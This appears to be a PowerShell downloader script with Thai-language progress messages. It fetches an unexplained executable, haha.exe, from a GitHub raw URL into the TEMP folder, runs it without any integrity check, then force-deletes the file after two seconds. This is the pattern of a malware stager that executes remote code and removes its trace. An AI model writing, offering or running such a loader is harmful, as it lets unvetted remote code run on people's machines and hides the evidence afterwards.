Write-Host "🔧 Script เริ่มรัน..." -ForegroundColor Cyan

$url = "https://raw.githubusercontent.com/auden131313/zxc/main/haha.exe"
$temp = "$env:TEMP\haha.exe"

Write-Host "📥 ดาวน์โหลด: $url" -ForegroundColor Yellow

try {
    Invoke-WebRequest -Uri $url -OutFile $temp -ErrorAction Stop
    Write-Host "✅ ดาวน์โหลดเสร็จ" -ForegroundColor Green
    
    Write-Host "🚀 รัน haha.exe..." -ForegroundColor Yellow
    & $temp
    
    Write-Host "⏳ รอ 2 วินาที..." -ForegroundColor Gray
    Start-Sleep 2
    
    Remove-Item $temp -Force -ErrorAction SilentlyContinue
    Write-Host "✅ ลบไฟล์ temp เสร็จ" -ForegroundColor Green
    
} catch {
    Write-Host "❌ ERROR: $_" -ForegroundColor Red
    Write-Host "⚠️ URL: $url" -ForegroundColor Yellow
    Write-Host "⚠️ Temp: $temp" -ForegroundColor Yellow
    Read-Host "กด Enter เพื่อปิด"
    exit
}

Write-Host "✅ เสร็จแล้ว!" -ForegroundColor Green